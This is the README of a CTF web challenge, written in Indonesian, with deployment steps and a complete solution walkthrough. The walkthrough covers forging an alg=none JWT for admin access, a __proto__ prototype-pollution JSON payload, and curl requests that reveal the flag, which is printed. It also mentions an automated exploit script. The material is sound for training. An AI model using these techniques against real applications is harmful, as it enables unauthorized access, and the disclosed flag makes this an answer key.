# ⚡ VaultOps Console — Web Exploitation CTF Challenge

> **Category**: Web Exploitation  
> **Difficulty**: Medium  
> **Author**: Jovian (vian0001)  
> **Target Platforms**: Vercel (Serverless Node.js), GitHub, Local Node.js  
> **Recommended Tool**: [WebHunter CTF Flag Finder](https://www.vian2030.my.id/tools/WebHunter/index.html)

---

## 📖 Deskripsi Skenario Challenge

> *"Portal internal DevOps **VaultOps Console (v1.0.4-beta)** baru saja dibuka untuk pengujian terbatas. Operator biasa hanya memiliki izin baca pada log publik. Terdapat sistem brankas **Flag Vault** berkeamanan tinggi yang hanya dapat dibuka oleh entitas Administrator dengan otorisasi runtime tertentu. Dapatkah kamu menemukan celah pada otentikasi dan integritas memorinya untuk merebut flag rahasia?"*

---

## 🚀 Cara Deploy ke GitHub & Vercel (1-Click Ready)

Challenge ini dirancang **100% kompatibel dengan arsitektur serverless Vercel** tanpa memerlukan Docker atau database eksternal.

### 1. Push ke GitHub
Buka terminal di folder project ini:
```bash
git init
git add .
git commit -m "feat: initial release of VaultOps CTF challenge"
git branch -M main
git remote add origin https://github.com/<username_kamu>/vaultops-ctf.git
git push -u origin main
```

### 2. Deploy ke Vercel
1. Buka dashboard [vercel.com](https://vercel.com) dan login dengan akun GitHub kamu.
2. Klik **"Add New..."** $\rightarrow$ **"Project"**.
3. Pilih repository `vaultops-ctf` yang baru kamu push.
4. Di bagian **Build and Output Settings**, biarkan default (Vercel akan otomatis mendeteksi `api/index.js` dan folder `public`).
5. *(Opsional)* Di bagian **Environment Variables**, kamu bisa menambahkan custom flag:
   - Key: `FLAG` $\rightarrow$ Value: `FLAG{custom_flag_kamu_disini}`
   - Key: `JWT_SECRET` $\rightarrow$ Value: `secret`
6. Klik **Deploy**! Dalam ~20 detik, challenge sudah live dan memiliki URL publik HTTPS gratis (contoh: `https://vaultops-ctf.vercel.app`).

---

## 💻 Cara Menjalankan Secara Lokal (Offline Practice)

Pastikan kamu sudah menginstal [Node.js](https://nodejs.org/) (versi 16+):

```bash
# 1. Install dependencies
npm install

# 2. Jalankan server lokal
npm start

# 3. Buka di browser
# http://localhost:3000
```

---

## 🎯 Panduan Menyelesaikan Challenge Menggunakan WebHunter

Kamu bisa menggunakan tool buatanmu sendiri ([WebHunter](https://www.vian2030.my.id/tools/WebHunter/index.html)) untuk menyelesaikan challenge ini:

```
[Target URL] 
     │
     ▼
[Stage 1: Recon] ─────────► WebHunter Source Analyzer & Header Inspector
     │                      (Menemukan X-System-Debug & /api/system/status)
     ▼
[Stage 2: JWT Tampering] ──► WebHunter JWT Decoder/Forger
     │                      (Ubah role ke 'admin' & forge token dengan alg:none)
     ▼
[Stage 3: Proto Pollution] ─► Kirim payload {"__proto__": {"vault_unlocked": true}}
     │                      ke endpoint /api/settings/merge
     ▼
[Stage 4: Flag Vault] ────► Request GET /api/flag dengan token admin
     │
     ▼
🏆 [FLAG CAPTURED]
```

### 1. Stage 1: Reconnaissance
1. Buka target website (`http://localhost:3000` atau URL Vercel).
2. Tekan `Ctrl+U` untuk melihat source HTML, lalu paste ke modul **Source Code Analyzer** di WebHunter:
   - WebHunter akan mendeteksi komentar HTML: `<!-- DEVELOPER NOTE: Diagnostic matrix exposed at /api/system/status. Fix before production deployment! -->`.
3. Buka modul **Header Inspector** di WebHunter dan masukkan response header:
   - Header `X-System-Debug` dan `X-Powered-By` mengonfirmasi versi beta dan backend Node.js serverless.
4. Kunjungi endpoint `/api/system/status` untuk membaca daftar route, skema otentikasi (JWT HS256), dan hint engine merge.

### 2. Stage 2: JWT Privilege Escalation
1. Buat akun biasa (misal: `operator1` / `password123`) di formulir registrasi.
2. Setelah login, kamu akan mendapatkan JWT token dan role `operator` (Access Level 1).
3. Salin token tersebut dan paste ke modul **JWT Decoder/Forge** di WebHunter:
   - Perhatikan payload: `{"username": "operator1", "role": "operator", "access_level": 1}`.
   - Edit payload di WebHunter menjadi:
     ```json
     {
       "username": "admin",
       "role": "admin",
       "access_level": 99,
       "can_view_vault": true
     }
     ```
   - Klik tombol **🔨 Forge Token (alg=none)** di WebHunter.
   - WebHunter akan membuat token baru dengan header `{"alg":"none","typ":"JWT"}`.
4. Salin token hasil forge tersebut, lalu paste ke bagian **"Manual Session Token Override"** di dashboard VaultOps, atau gunakan cURL:
   ```bash
   curl -H "Authorization: Bearer <TOKEN_FORGE_DARI_WEBHUNTER>" http://localhost:3000/api/user/me
   ```
   *Hasil: Server memvalidasi kamu sebagai `admin` (`isAdmin: true`)!*

### 3. Stage 3: Node.js Prototype Pollution
1. Jika kamu mencoba mengakses Flag Vault (`GET /api/flag`) hanya dengan token admin, server akan menolak dengan pesan:
   ```json
   {
     "error": "Security Lock Active.",
     "message": "Admin access verified! However, the master hardware vault is locked.",
     "hint": "Find the recursive merge endpoint (/api/settings/merge) and pollute the global configuration with { 'vault_unlocked': true }."
   }
   ```
2. Temukan panel **Preferences & Cloud Sync** di web atau kirim POST request ke `/api/settings/merge`.
3. Kirim payload JSON berikut:
   ```json
   {
     "theme": "dark",
     "__proto__": {
       "vault_unlocked": true
     }
   }
   ```
4. Fungsi `recursiveMerge()` di backend akan mengekstrak key `__proto__` dan menginjeksi properti `vault_unlocked = true` langsung ke `Object.prototype` runtime Node.js!

### 4. Stage 4: Flag Extraction
1. Klik tombol **"Request Flag Access"** di web atau jalankan:
   ```bash
   curl -H "Authorization: Bearer <TOKEN_ADMIN>" http://localhost:3000/api/flag
   ```
2. Response dari server:
   ```json
   {
     "success": true,
     "message": "🎉 Congratulations! You have bypassed both JWT validation and polluted the Node.js runtime prototype.",
     "flag": "FLAG{vau1t_0ps_pr0t0_p0llut10n_&_jwt_m4st3r_2026}",
     "captured_by": "admin",
     "level": "WEB-EXPLOIT-PWNED"
   }
   ```

---

## 🤖 Automated Exploit Script

Tersedia script Python yang mengotomatisasi seluruh alur di atas:

```bash
# Pastikan library requests terinstall
pip install requests

# Jalankan exploit ke target lokal
python exploit/solve.py http://localhost:3000

# Atau jalankan ke URL Vercel kamu
python exploit/solve.py https://vaultops-ctf.vercel.app
```

---

## 📁 Struktur File Project

```
├── api/
│   └── index.js         # Backend Serverless Express (Vercel API & Logic)
├── public/
│   ├── index.html       # Web UI VaultOps Console (Cyberpunk Theme)
│   ├── style.css        # Responsive CSS Dark Mode
│   └── app.js           # Frontend Client Script
├── exploit/
│   └── solve.py         # Automated Solver Script
├── package.json         # Node.js dependencies & scripts
├── vercel.json          # Vercel routing configuration
└── README.md            # Dokumentasi lengkap & writeup
```
